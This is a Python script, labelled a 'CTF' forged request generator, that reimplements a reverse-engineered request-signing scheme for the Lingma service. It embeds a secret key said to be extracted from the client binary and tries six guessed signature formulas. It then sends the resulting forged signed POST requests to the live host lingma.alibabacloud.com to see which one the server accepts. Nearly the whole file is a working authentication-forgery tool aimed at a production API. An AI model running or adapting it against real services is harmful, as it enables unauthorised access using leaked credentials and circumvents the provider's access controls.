"""Reproduce the Lingma signing algorithm and forge HTTP requests.

Based on reverse engineering of getAppSalt (0x882760) and SHA-256 (0x4563c0):

Signing algorithm:
1. Get the secret signing key (hardcoded in getAppSalt)
2. Build a string to sign from: date + endpoint + request body
3. Compute SHA-256 hash of the string-to-sign
4. Format as hex and use as Signature header value

Map returned by getAppSalt:
  {"Date": "<http-date>", "Signature": "<hex-sha256>", "Appcode": "cosy", "<4th-key>": "<4th-value>"}
"""
import hashlib
import time
import json
import hmac
from datetime import datetime, timezone

# Secrets found in getAppSalt at RVA 0x24ee3ab and 0x24ee3cb
SECRET_FULL = "&Q3C3!N5mP5bbNcyryMY@KZtUFLRGbTed2FyLCB3YXIgbmV2ZXIgY2hhbmdlcw==9f1dff714a390b20aeb19175ecc496e6"
SECRET_BASE64_PART = "d2FyLCB3YXIgbmV2ZXIgY2hhbmdlcw=="  # "war, war never changes"
SECRET_PREFIX = "&Q3C3!N5mP5bbNcyryMY@KZtUFLRGbTe"

# Known config values
ENDPOINT = "https://lingma.alibabacloud.com/algo"
APPCODE = "cosy"

def get_http_date():
    """Format: Mon, 02 Jan 2006 15:04:05 GMT (Go time format)"""
    return datetime.now(timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")

def compute_signature_v1(date_str, endpoint="/algo/api/v1/ping", body=""):
    """Attempt 1: SHA-256 of concatenated date + endpoint + body."""
    to_sign = f"{date_str}{endpoint}{body}"
    sig = hashlib.sha256(to_sign.encode('utf-8')).hexdigest()
    return sig

def compute_signature_v2(date_str, endpoint="/algo/api/v1/ping", body=""):
    """Attempt 2: HMAC-SHA256 with the secret key."""
    to_sign = f"{date_str}{endpoint}{body}"
    sig = hmac.new(SECRET_FULL.encode('utf-8'), to_sign.encode('utf-8'), hashlib.sha256).hexdigest()
    return sig

def compute_signature_v3(date_str, endpoint="/algo/api/v1/ping", body=""):
    """Attempt 3: SHA-256 of secret + date + endpoint."""
    to_sign = f"{SECRET_FULL}{date_str}{endpoint}"
    sig = hashlib.sha256(to_sign.encode('utf-8')).hexdigest()
    return sig

def compute_signature_v4(date_str, endpoint="/algo/api/v1/ping", body=""):
    """Attempt 4: SHA-256 of just the date (simplest possible)."""
    sig = hashlib.sha256(date_str.encode('utf-8')).hexdigest()
    return sig

def compute_signature_v5(date_str, endpoint="/algo/api/v1/ping", body=""):
    """Attempt 5: HMAC-SHA256 with just the prefix secret."""
    to_sign = f"{date_str}{endpoint}"
    sig = hmac.new(SECRET_PREFIX.encode('utf-8'), to_sign.encode('utf-8'), hashlib.sha256).hexdigest()
    return sig

def compute_signature_v6(date_str, endpoint="/algo/api/v1/ping", body=""):
    """Attempt 6: SHA-256 of endpoint + date + body + secret."""
    to_sign = f"{endpoint}{date_str}{body}{SECRET_FULL}"
    sig = hashlib.sha256(to_sign.encode('utf-8')).hexdigest()
    return sig

def build_headers(date_str, signature, endpoint="/algo/api/v1/ping"):
    """Build the full set of headers for a signed request."""
    return {
        "Content-Type": "application/json",
        "Date": date_str,
        "Signature": signature,
        "Appcode": APPCODE,
        "Host": "lingma.alibabacloud.com",
    }

def test_signing():
    """Test all signature variants."""
    date_str = get_http_date()

    print("=" * 70)
    print("Lingma Signing Algorithm Test")
    print("=" * 70)
    print(f"Date: {date_str}")
    print(f"Endpoint: {ENDPOINT}")
    print(f"Appcode: {APPCODE}")
    print(f"Secret (full): {SECRET_FULL[:30]}...")
    print(f"Secret (prefix): {SECRET_PREFIX}")
    print(f"Secret (decoded): '{SECRET_BASE64_PART}' -> 'war, war never changes'")
    print()

    variants = {
        "v1: SHA-256(date+endpoint+body)": compute_signature_v1,
        "v2: HMAC-SHA256(full_secret, date+endpoint)": compute_signature_v2,
        "v3: SHA-256(secret+date+endpoint)": compute_signature_v3,
        "v4: SHA-256(date only)": compute_signature_v4,
        "v5: HMAC-SHA256(prefix_secret, date+endpoint)": compute_signature_v5,
        "v6: SHA-256(endpoint+date+body+secret)": compute_signature_v6,
    }

    for name, func in variants.items():
        sig = func(date_str)
        print(f"  {name}")
        print(f"    Signature: {sig}")
        print()

    return variants

def send_test_request(date_str, signature, variant_name):
    """Send a test HTTP request to verify the signature."""
    import urllib.request

    url = f"{ENDPOINT}/api/v1/ping"
    headers = build_headers(date_str, signature)
    body = json.dumps({}).encode('utf-8')

    req = urllib.request.Request(url, data=body, headers=headers, method='POST')

    print(f"\n  Sending request with {variant_name}...")
    print(f"  URL: {url}")
    print(f"  Headers: {json.dumps(dict(headers), indent=4)}")

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            print(f"  Status: {resp.status}")
            print(f"  Response: {resp.read().decode('utf-8')[:500]}")
            return True
    except urllib.error.HTTPError as e:
        print(f"  HTTP Error: {e.code}")
        print(f"  Response: {e.read().decode('utf-8', errors='replace')[:500]}")
        return False
    except Exception as e:
        print(f"  Error: {type(e).__name__}: {e}")
        return False

def main():
    print("=" * 70)
    print("Lingma CTF - Forged Request Generator")
    print("=" * 70)
    print()

    # Step 1: Generate signatures
    variants = test_signing()

    # Step 2: Try each variant
    print("\n" + "=" * 70)
    print("Testing each signature variant against the server")
    print("=" * 70)

    date_str = get_http_date()
    endpoint = "/algo/api/v1/ping"

    results = {}
    for name, func in variants.items():
        sig = func(date_str, endpoint)
        success = send_test_request(date_str, sig, name)
        results[name] = success
        time.sleep(1)  # Rate limiting

    # Summary
    print("\n" + "=" * 70)
    print("Results Summary")
    print("=" * 70)
    for name, success in results.items():
        status = "OK" if success else "FAILED"
        print(f"  [{status}] {name}")

if __name__ == '__main__':
    main()
